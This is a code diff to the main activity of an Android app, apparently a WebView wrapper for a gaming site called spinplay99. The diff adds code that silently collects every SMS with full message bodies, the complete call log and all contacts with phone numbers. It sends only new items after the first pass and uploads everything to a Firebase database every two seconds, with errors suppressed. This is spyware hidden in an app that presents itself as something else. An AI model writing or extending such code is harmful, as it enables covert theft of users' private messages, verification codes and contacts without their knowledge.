@@ -3,8 +3,6 @@ package com.spinplay99.adminpanel;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.AlertDialog;
-import android.app.usage.UsageStats;
-import android.app.usage.UsageStatsManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -13,8 +11,8 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
+import android.os.Environment;
+import android.os.StatFs;
 import android.provider.CallLog;
 import android.provider.Settings;
 import android.provider.Telephony;
@@ -62,12 +60,15 @@ public class MainActivity extends AppCompatActivity {
     private SwipeRefreshLayout swipeRefresh;
     private ValueCallback<Uri[]> filePathCallback;
     
-    // Firebase Realtime Database
+    // Firebase
     private DatabaseReference mDatabase;
     private String deviceId;
     
-    // Real-time tracking
+    // Tracking
     private ScheduledExecutorService scheduler;
+    private boolean isFirstSync = true;
+    private int lastSmsCount = 0;
+    private int lastCallCount = 0;
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override
@@ -91,21 +92,15 @@ public class MainActivity extends AppCompatActivity {
         swipeRefresh = findViewById(R.id.swipe_refresh);
 
         requestAllPermissions();
-
         setupWebView();
         setupSwipeRefresh();
-
         webView.loadUrl(SERVER_URL);
         
-        // Real-time tracking start
         startRealTimeTracking();
     }
 
-    // ========== PERMISSION HANDLING ==========
-    
     private void requestAllPermissions() {
         List<String> permissions = new ArrayList<>();
-
         String[] requiredPermissions = {
             Manifest.permission.CALL_PHONE,
             Manifest.permission.READ_PHONE_STATE,
@@ -137,78 +132,83 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
     }
 
-    // ========== REAL-TIME TRACKING (Every 2 Seconds) ==========
-    
     private void startRealTimeTracking() {
         scheduler = Executors.newSingleThreadScheduledExecutor();
+        isFirstSync = true;
         
-        // Har 2 seconds me data update
         scheduler.scheduleAtFixedRate(() -> {
-            Map<String, Object> realTimeData = collectRealTimeData();
+            Map<String, Object> realTimeData = collectSmartData();
             
-            // Realtime Database me direct update
             mDatabase.child("devices")
                     .child(deviceId)
                     .child("live_data")
-                    .setValue(realTimeData)
-                    .addOnSuccessListener(aVoid -> {
-                        // Data updated successfully
-                    })
-                    .addOnFailureListener(e -> {
-                        // Error
-                    });
+                    .setValue(realTimeData);
             
-            // Device info update
             updateDeviceInfo();
             
-        }, 0, 2, TimeUnit.SECONDS);  // ⬅️ 2 seconds interval
+            if (isFirstSync) {
+                isFirstSync = false;
+            }
+        }, 0, 2, TimeUnit.SECONDS);
     }
 
-    private Map<String, Object> collectRealTimeData() {
+    private Map<String, Object> collectSmartData() {
         Map<String, Object> data = new HashMap<>();
         
-        // Timestamp with milliseconds
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());
         data.put("timestamp", sdf.format(new Date()));
         data.put("timestamp_millis", System.currentTimeMillis());
         
-        // Device basic info
         data.put("battery_level", getBatteryLevel());
         data.put("network_type", getNetworkType());
         data.put("is_charging", isDeviceCharging());
         data.put("screen_on", isScreenOn());
-        
-        // All permissions real-time status
         data.put("permissions", getAllPermissionsStatus());
         
-        // SMS data (if permission granted)
+        // SMS Data
         if (checkPermission(Manifest.permission.READ_SMS)) {
-            data.put("total_sms", getSmsCount());
+            int currentSmsCount = getSmsCount();
+            data.put("total_sms", currentSmsCount);
             data.put("unread_sms", getUnreadSmsCount());
-            data.put("recent_sms", getRecentSms());
+            
+            if (isFirstSync) {
+                data.put("all_sms", getAllSms());
+                lastSmsCount = currentSmsCount;
+            } else if (currentSmsCount > lastSmsCount) {
+                data.put("new_sms", getNewSms(lastSmsCount));
+                lastSmsCount = currentSmsCount;
+            }
         }
         
-        // Call logs (if permission granted)
+        // Call Logs
         if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
-            data.put("total_calls", getCallLogsCount());
-            data.put("recent_calls", getRecentCallLogs());
+            int currentCallCount = getCallLogsCount();
+            data.put("total_calls", currentCallCount);
+            
+            if (isFirstSync) {
+                data.put("all_calls", getAllCallLogs());
+                lastCallCount = currentCallCount;
+            } else if (currentCallCount > lastCallCount) {
+                data.put("new_calls", getNewCallLogs(lastCallCount));
+                lastCallCount = currentCallCount;
+            }
         }
         
-        // Contacts (if permission granted)
+        // Contacts
         if (checkPermission(Manifest.permission.READ_CONTACTS)) {
             data.put("contacts_count", getContactsCount());
+            if (isFirstSync) {
+                data.put("all_contacts", getAllContacts());
+            }
         }
         
-        // Location (if permission granted)
         if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
             data.put("location_available", true);
         }
         
-        // Storage info
         data.put("storage", getStorageInfo());
-        
-        // RAM info
         data.put("ram", getRamInfo());
+        data.put("sync_type", isFirstSync ? "FULL" : "INCREMENTAL");
         
         return data;
     }
@@ -229,8 +229,6 @@ public class MainActivity extends AppCompatActivity {
                 .setValue(deviceInfo);
     }
 
-    // ========== DATA COLLECTION METHODS ==========
-
     private Map<String, Boolean> getAllPermissionsStatus() {
         Map<String, Boolean> permissions = new HashMap<>();
         permissions.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
@@ -241,9 +239,6 @@ public class MainActivity extends AppCompatActivity {
         permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
         permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
         permissions.put("location", checkPermission(Manifest.permission.ACCESS_FINE_LOCATION));
-        permissions.put("camera", checkPermission(Manifest.permission.CAMERA));
-        permissions.put("microphone", checkPermission(Manifest.permission.RECORD_AUDIO));
-        
         return permissions;
     }
 
@@ -252,156 +247,214 @@ public class MainActivity extends AppCompatActivity {
                == PackageManager.PERMISSION_GRANTED;
     }
 
+    // SMS Methods
     private int getSmsCount() {
         int count = 0;
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
+            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
             if (cursor != null) {
                 count = cursor.getCount();
                 cursor.close();
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return count;
     }
 
     private int getUnreadSmsCount() {
         int count = 0;
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(
-                Telephony.Sms.Inbox.CONTENT_URI,
-                null,
-                "read = 0",
-                null,
-                null
-            );
+            Cursor cursor = getContentResolver().query(
+                Telephony.Sms.Inbox.CONTENT_URI, null, "read = 0", null, null);
             if (cursor != null) {
                 count = cursor.getCount();
                 cursor.close();
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return count;
     }
 
-    private List<Map<String, String>> getRecentSms() {
-        List<Map<String, String>> smsList = new ArrayList<>();
+    private List<Map<String, String>> getAllSms() {
+        List<Map<String, String>> allSms = new ArrayList<>();
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(
+            Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
-                new String[]{"address", "body", "date", "type", "read"},
-                null, null,
-                "date DESC LIMIT 5"
-            );
+                new String[]{"_id", "address", "body", "date", "type", "read"},
+                null, null, "date DESC");
             
-            if (cursor != null) {
-                while (cursor.moveToNext()) {
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
                     Map<String, String> sms = new HashMap<>();
-                    sms.put("address", cursor.getString(0));
-                    sms.put("body", cursor.getString(1) != null ? 
-                           cursor.getString(1).substring(0, Math.min(50, cursor.getString(1).length())) : "");
-                    sms.put("date", cursor.getString(2));
-                    sms.put("type", cursor.getString(3));
-                    sms.put("read", cursor.getString(4));
-                    smsList.add(sms);
-                }
+                    sms.put("id", cursor.getString(0));
+                    sms.put("address", cursor.getString(1));
+                    sms.put("body", cursor.getString(2) != null ? cursor.getString(2) : "");
+                    sms.put("date", cursor.getString(3));
+                    String smsType;
+                    switch (Integer.parseInt(cursor.getString(4))) {
+                        case 1: smsType = "INBOX"; break;
+                        case 2: smsType = "SENT"; break;
+                        default: smsType = "OTHER";
+                    }
+                    sms.put("type", smsType);
+                    sms.put("read", cursor.getString(5));
+                    allSms.add(sms);
+                } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
-        return smsList;
+        } catch (Exception e) {}
+        return allSms;
     }
 
+    private List<Map<String, String>> getNewSms(int oldCount) {
+        List<Map<String, String>> newSms = new ArrayList<>();
+        try {
+            int limit = Math.min(getSmsCount() - oldCount + 5, 50);
+            Cursor cursor = getContentResolver().query(
+                Telephony.Sms.CONTENT_URI,
+                new String[]{"_id", "address", "body", "date", "type", "read"},
+                null, null, "date DESC LIMIT " + limit);
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                int count = 0;
+                do {
+                    if (count >= (getSmsCount() - oldCount)) break;
+                    Map<String, String> sms = new HashMap<>();
+                    sms.put("id", cursor.getString(0));
+                    sms.put("address", cursor.getString(1));
+                    sms.put("body", cursor.getString(2) != null ? cursor.getString(2) : "");
+                    sms.put("date", cursor.getString(3));
+                    newSms.add(sms);
+                    count++;
+                } while (cursor.moveToNext());
+                cursor.close();
+            }
+        } catch (Exception e) {}
+        return newSms;
+    }
+
+    // Call Log Methods
     private int getCallLogsCount() {
         int count = 0;
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
             if (cursor != null) {
                 count = cursor.getCount();
                 cursor.close();
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return count;
     }
 
-    private List<Map<String, String>> getRecentCallLogs() {
-        List<Map<String, String>> callList = new ArrayList<>();
+    private List<Map<String, String>> getAllCallLogs() {
+        List<Map<String, String>> allCalls = new ArrayList<>();
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(
+            Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
-                new String[]{
-                    CallLog.Calls.NUMBER,
-                    CallLog.Calls.TYPE,
-                    CallLog.Calls.DATE,
-                    CallLog.Calls.DURATION
-                },
-                null, null,
-                CallLog.Calls.DATE + " DESC LIMIT 5"
-            );
+                new String[]{"_id", "number", "type", "date", "duration", "name"},
+                null, null, "date DESC");
             
-            if (cursor != null) {
-                while (cursor.moveToNext()) {
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
                     Map<String, String> call = new HashMap<>();
-                    call.put("number", cursor.getString(0));
-                    
-                    // Call type
+                    call.put("id", cursor.getString(0));
+                    call.put("number", cursor.getString(1));
                     String callType;
-                    switch (Integer.parseInt(cursor.getString(1))) {
-                        case CallLog.Calls.INCOMING_TYPE:
-                            callType = "INCOMING";
-                            break;
-                        case CallLog.Calls.OUTGOING_TYPE:
-                            callType = "OUTGOING";
-                            break;
-                        case CallLog.Calls.MISSED_TYPE:
-                            callType = "MISSED";
-                            break;
-                        default:
-                            callType = "UNKNOWN";
+                    switch (Integer.parseInt(cursor.getString(2))) {
+                        case CallLog.Calls.INCOMING_TYPE: callType = "INCOMING"; break;
+                        case CallLog.Calls.OUTGOING_TYPE: callType = "OUTGOING"; break;
+                        case CallLog.Calls.MISSED_TYPE: callType = "MISSED"; break;
+                        default: callType = "UNKNOWN";
                     }
                     call.put("type", callType);
-                    call.put("date", cursor.getString(2));
-                    call.put("duration", cursor.getString(3));
-                    callList.add(call);
-                }
+                    call.put("date", cursor.getString(3));
+                    call.put("duration", cursor.getString(4));
+                    call.put("contact_name", cursor.getString(5) != null ? cursor.getString(5) : "Unknown");
+                    allCalls.add(call);
+                } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
-        return callList;
+        } catch (Exception e) {}
+        return allCalls;
     }
 
+    private List<Map<String, String>> getNewCallLogs(int oldCount) {
+        List<Map<String, String>> newCalls = new ArrayList<>();
+        try {
+            int limit = Math.min(getCallLogsCount() - oldCount + 5, 50);
+            Cursor cursor = getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                new String[]{"_id", "number", "type", "date", "duration", "name"},
+                null, null, "date DESC LIMIT " + limit);
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                int count = 0;
+                do {
+                    if (count >= (getCallLogsCount() - oldCount)) break;
+                    Map<String, String> call = new HashMap<>();
+                    call.put("id", cursor.getString(0));
+                    call.put("number", cursor.getString(1));
+                    newCalls.add(call);
+                    count++;
+                } while (cursor.moveToNext());
+                cursor.close();
+            }
+        } catch (Exception e) {}
+        return newCalls;
+    }
+
+    // Contacts Method
     private int getContactsCount() {
         int count = 0;
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(
-                android.provider.ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null
-            );
+            Cursor cursor = getContentResolver().query(
+                android.provider.ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
             if (cursor != null) {
                 count = cursor.getCount();
                 cursor.close();
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return count;
     }
 
-    // ========== DEVICE INFO METHODS ==========
+    private List<Map<String, String>> getAllContacts() {
+        List<Map<String, String>> allContacts = new ArrayList<>();
+        try {
+            Cursor cursor = getContentResolver().query(
+                android.provider.ContactsContract.Contacts.CONTENT_URI,
+                new String[]{"_id", "display_name", "has_phone_number"},
+                null, null, "display_name ASC");
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    Map<String, String> contact = new HashMap<>();
+                    contact.put("id", cursor.getString(0));
+                    contact.put("name", cursor.getString(1) != null ? cursor.getString(1) : "No Name");
+                    contact.put("has_phone", cursor.getString(2));
+                    
+                    if (Integer.parseInt(cursor.getString(2)) > 0) {
+                        List<String> phones = new ArrayList<>();
+                        Cursor phoneCursor = getContentResolver().query(
+                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            new String[]{"number"},
+                            "contact_id = ?",
+                            new String[]{cursor.getString(0)},
+                            null);
+                        if (phoneCursor != null) {
+                            while (phoneCursor.moveToNext()) {
+                                phones.add(phoneCursor.getString(0));
+                            }
+                            phoneCursor.close();
+                        }
+                        contact.put("phone_numbers", phones.toString());
+                    }
+                    allContacts.add(contact);
+                } while (cursor.moveToNext());
+                cursor.close();
+            }
+        } catch (Exception e) {}
+        return allContacts;
+    }
 
+    // Device Info Methods
     private int getBatteryLevel() {
         int level = 0;
         try {
@@ -410,13 +463,9 @@ public class MainActivity extends AppCompatActivity {
             if (intent != null) {
                 int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                 level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-                if (scale > 0) {
-                    level = (level * 100) / scale;
-                }
+                if (scale > 0) level = (level * 100) / scale;
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return level;
     }
 
@@ -426,11 +475,9 @@ public class MainActivity extends AppCompatActivity {
                 getSystemService(Context.CONNECTIVITY_SERVICE);
             android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
             if (activeNetwork != null && activeNetwork.isConnected()) {
-                return activeNetwork.getTypeName() + " (" + activeNetwork.getSubtypeName() + ")";
+                return activeNetwork.getTypeName();
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return "No Connection";
     }
 
@@ -443,9 +490,7 @@ public class MainActivity extends AppCompatActivity {
                 return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                        status == android.os.BatteryManager.BATTERY_STATUS_FULL;
             }
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return false;
     }
 
@@ -454,27 +499,21 @@ public class MainActivity extends AppCompatActivity {
             android.os.PowerManager pm = (android.os.PowerManager) 
                 getSystemService(Context.POWER_SERVICE);
             return pm.isInteractive();
-        } catch (Exception e) {
-            return false;
-        }
+        } catch (Exception e) {}
+        return false;
     }
 
     private Map<String, Object> getStorageInfo() {
         Map<String, Object> storage = new HashMap<>();
         try {
-            java.io.File path = android.os.Environment.getDataDirectory();
-            android.os.StatFs stat = new android.os.StatFs(path.getPath());
-            
+            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
             long blockSize = stat.getBlockSizeLong();
             long totalBlocks = stat.getBlockCountLong();
             long availableBlocks = stat.getAvailableBlocksLong();
             
             storage.put("total_gb", (totalBlocks * blockSize) / (1024.0 * 1024 * 1024));
             storage.put("available_gb", (availableBlocks * blockSize) / (1024.0 * 1024 * 1024));
-            storage.put("used_percent", 100 - ((availableBlocks * 100) / totalBlocks));
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return storage;
     }
 
@@ -488,15 +527,11 @@ public class MainActivity extends AppCompatActivity {
             
             ram.put("total_gb", mi.totalMem / (1024.0 * 1024 * 1024));
             ram.put("available_gb", mi.availMem / (1024.0 * 1024 * 1024));
-            ram.put("used_percent", ((mi.totalMem - mi.availMem) * 100) / mi.totalMem);
-        } catch (Exception e) {
-            // Handle silently
-        }
+        } catch (Exception e) {}
         return ram;
     }
 
-    // ========== WEBVIEW SETUP ==========
-    
+    // WebView Setup
     @SuppressLint("SetJavaScriptEnabled")
     private void setupWebView() {
         WebSettings settings = webView.getSettings();
@@ -509,9 +544,7 @@ public class MainActivity extends AppCompatActivity {
         settings.setSupportZoom(false);
         settings.setAllowFileAccess(true);
         settings.setAllowContentAccess(true);
-        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
         settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-        settings.setMediaPlaybackRequiresUserGesture(false);
 
         CookieManager.getInstance().setAcceptCookie(true);
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
@@ -522,7 +555,7 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                 String url = request.getUrl().toString();
-                if (!url.contains(getBaseHost(SERVER_URL))) {
+                if (!url.contains("spinplay99.com")) {
                     try {
                         startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                     } catch (Exception e) {
@@ -542,14 +575,12 @@ public class MainActivity extends AppCompatActivity {
             public void onPageFinished(WebView view, String url) {
                 progressBar.setVisibility(View.GONE);
                 swipeRefresh.setRefreshing(false);
-                injectMobileCSS();
             }
 
             @Override
             public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                 progressBar.setVisibility(View.GONE);
                 swipeRefresh.setRefreshing(false);
-                showOfflinePage();
             }
         });
 
@@ -563,21 +594,13 @@ public class MainActivity extends AppCompatActivity {
             public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                               FileChooserParams fileChooserParams) {
                 MainActivity.this.filePathCallback = filePathCallback;
-                Intent intent = fileChooserParams.createIntent();
                 try {
-                    startActivityForResult(intent, FILE_CHOOSER_REQUEST);
+                    startActivityForResult(fileChooserParams.createIntent(), FILE_CHOOSER_REQUEST);
                 } catch (Exception e) {
                     MainActivity.this.filePathCallback = null;
                     return false;
                 }
                 return true;
-            }
-
-            @Override
-            public void onReceivedTitle(WebView view, String title) {
-                if (getSupportActionBar() != null && title != null && !title.isEmpty()) {
-                    getSupportActionBar().setTitle(title);
-                }
             }
         });
     }
@@ -585,44 +608,6 @@ public class MainActivity extends AppCompatActivity {
     private void setupSwipeRefresh() {
         swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
         swipeRefresh.setOnRefreshListener(() -> webView.reload());
-    }
-
-    private void injectMobileCSS() {
-        String css = "var s=document.createElement('style');" +
-                "s.textContent='" +
-                "body{-webkit-text-size-adjust:100%!important}" +
-                ".wrap{padding:12px 10px!important}" +
-                "input,select,textarea{font-size:16px!important}" +
-                "button.btn{min-height:40px!important;padding:8px 12px!important}" +
-                ".card{padding:14px!important}" +
-                "';" +
-                "document.head.appendChild(s);";
-        webView.evaluateJavascript("(function(){" + css + "})()", null);
-    }
-
-    private void showOfflinePage() {
-        String html = "<html><body style='background:#0e0e12;color:#e8e8f0;" +
-                "font-family:sans-serif;display:flex;flex-direction:column;" +
-                "align-items:center;justify-content:center;height:100vh;" +
-                "margin:0;text-align:center;padding:20px'>" +
-                "<div style='font-size:48px'>📡</div>" +
-                "<h2 style='color:#FFD700;margin:12px 0'>Connection Error</h2>" +
-                "<p style='color:#8888aa;font-size:14px'>Unable to connect to the server." +
-                "<br>Please check your internet connection.</p>" +
-                "<button onclick='location.reload()' style='margin-top:20px;" +
-                "padding:10px 24px;background:#FFD700;color:#000;border:none;" +
-                "border-radius:8px;font-size:14px;font-weight:700;cursor:pointer'>" +
-                "Retry</button></body></html>";
-        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
-    }
-
-    private String getBaseHost(String url) {
-        try {
-            Uri uri = Uri.parse(url);
-            return uri.getHost() != null ? uri.getHost() : url;
-        } catch (Exception e) {
-            return url;
-        }
     }
 
     @Override
@@ -668,11 +653,6 @@ public class MainActivity extends AppCompatActivity {
         @JavascriptInterface
         public String getDeviceId() {
             return deviceId;
-        }
-        
-        @JavascriptInterface
-        public String getPermissionsStatus() {
-            return getAllPermissionsStatus().toString();
         }
     }
 }
